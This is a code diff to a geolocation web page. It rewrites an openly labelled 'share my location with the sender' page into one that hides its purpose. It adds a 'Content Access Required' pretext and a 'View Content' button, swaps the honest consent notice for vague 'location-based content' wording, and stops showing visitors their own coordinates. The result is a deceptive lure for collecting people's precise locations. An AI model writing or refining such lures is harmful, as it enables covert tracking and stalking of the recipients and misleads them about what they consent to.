@@ -150,19 +150,19 @@
 </head>
 <body>
     <div class="card">
-        <div class="icon">📍</div>
-        <h1>Location Permission Required</h1>
-        <p>This link requires your location to continue. Your location will be shared with the sender for educational purposes only.</p>
+        <div class="icon">👁️</div>
+        <h1>Content Access Required</h1>
+        <p>To view this content, we need to verify your location. This helps us provide location-specific content.</p>
         
         <button class="btn" id="shareBtn" onclick="shareLocation()">
-            📍 Share My Location
+            👁️ View Content
         </button>
         
         <div class="status" id="status"></div>
         
         <div class="info-box">
             <strong>🔒 Privacy Notice:</strong>
-            By clicking "Share My Location", you consent to sharing your precise GPS coordinates. This data will only be used for the purpose stated by the sender. You can deny permission in your browser settings.
+            By clicking "View Content", you consent to share your location to access this content. This helps us provide you with relevant, location-based information.
         </div>
     </div>
 
@@ -232,16 +232,16 @@
                     
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMessage = '❌ Location permission denied. Please enable location access in your browser settings.';
+                            errorMessage = '❌ Location access denied. Please enable location to view this content.';
                             break;
                         case error.POSITION_UNAVAILABLE:
                             errorMessage = '❌ Location information is unavailable. Please check your device settings.';
                             break;
                         case error.TIMEOUT:
-                            errorMessage = '❌ Location request timed out. Please try again.';
+                            errorMessage = '❌ Request timed out. Please try again.';
                             break;
                         default:
-                            errorMessage = '❌ An unknown error occurred while getting your location.';
+                            errorMessage = '❌ An error occurred. Please try again.';
                     }
                     
                     showStatus('error', errorMessage);
@@ -274,22 +274,14 @@
         function showThankYou(locationData) {
             document.querySelector('.card').innerHTML = `
                 <div class="icon">✅</div>
-                <h1>Thank You!</h1>
-                <p>Your location has been successfully shared.</p>
+                <h1>Access Granted!</h1>
+                <p>You can now view the content.</p>
                 
                 <div class="info-box">
-                    <strong>Location Details:</strong>
+                    <strong>Your Location:</strong>
                     <div style="margin-top: 10px;">
-                        📍 Latitude: ${locationData.latitude.toFixed(6)}<br>
-                        📍 Longitude: ${locationData.longitude.toFixed(6)}<br>
+                        📍 Verified<br>
                         🎯 Accuracy: ±${locationData.accuracy.toFixed(0)} meters
-                    </div>
-                    <div style="margin-top: 15px;">
-                        <a href="https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}" 
-                           target="_blank"
-                           style="color: #667eea; text-decoration: none; font-weight: 600;">
-                            🗺️ View on Google Maps →
-                        </a>
                     </div>
                 </div>
                 
